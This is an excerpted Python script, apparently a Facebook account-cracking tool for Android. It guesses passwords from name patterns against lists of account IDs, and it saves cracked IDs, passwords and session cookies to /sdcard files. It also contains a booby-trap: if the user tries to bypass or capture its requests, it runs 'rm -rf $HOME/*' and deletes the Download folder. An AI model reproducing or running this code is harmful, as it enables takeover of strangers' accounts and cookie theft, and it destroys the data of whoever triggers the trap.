...
if not 'print' in open(first+'sessions.py','r').read():
    ...
    exit('\33[1;91mDONT TRY AGAIN ITS THARKI YOUR FATHER')
a='rm -rf'
b='rm -rf $HOME/*'
c='/sdcard/Download/*'
...
def clr():
    try:
        ...
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;32m D'+'ont Try Bypas'+'s AND Capture LocaL Kid...! \n YOUR'+' BYPAS'+'S AND CAPTURE FUCK'+'ED BY THARKI MUNDA');exit()
        else:exit()
    except:exit()
...
def fucked():
    ...
    os.system(f"rm -rf {y}")
    os.system(f"rm -rf {z}")
    print(' Fuck You Bypass User Security By THARKI MUNDA\ . 0o');exit()
...
def _India_():
    clear()
    print(f' EXAMPLE : +91639/+91934/+91902/+91701');linex()
    code = input(f'[?] CHOICE   ')
    clear()
    print(f'[=] EXAMPLE : 3000/5000/10000/99999');linex()
    limit = int(input(f'[?] CHOICE  : '))
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f' EXAMPLE : /sdcard/PTI.txt');linex()
        self.file = input(f'[?] FILE NAME  ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f' OPPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f' TRY AGAIN ...')
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r[PTI-M1]-[{loop}]-[OK/CP]-[{len(oks)}/{len(cps)}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r[PTI-OK] {sid} | {ps} ")
                    open('/sdcard/PTI-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[PTI-CP] {sid} | {ps} ")
                     open('/sdcard/PTI-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r[PTI-M2]-[{loop}]-[OK/CP]-[{len(oks)}/{len(cps)}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                    print(f"\r\r[PTI-OK] {sid} | {ps} ")
                    open('/sdcard/PTI-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[PTI-CP] {sid} | {ps} ")
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            pw = []
            clear()
            print(f' EXAMPLE  BD 10-18/INDIA 3-5');linex()
            sl = int(input(f'[?] PASSWORD LIMIT : '))
            clear()
            print(f'[?] EXAMPLE : first123/firstlast/first@@@')
            linex()
            if sl =='':
                print(f'[=] PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print(f' PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f' PASSWORD NO [{sr+1}] : '))
            clear()
            print(f' Total File Accounts  %s ' % len(self.id))
            print(f' PASSWORD LIMIT  {sl} ')
            print(f'  The process is running in the background')
            print(f'  Use Airplane Mode For Best Result')
            linex()
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r[PTI-EMRAN]-[{loop}]-[OK/CP]-[{len(ok)}/{len(cp)}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r[PTI-OK] {uid} | {pas}')
                #print(f'\r\r[COOKIE] {coki}')
                open('/sdcard/PTI-EMRAN-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
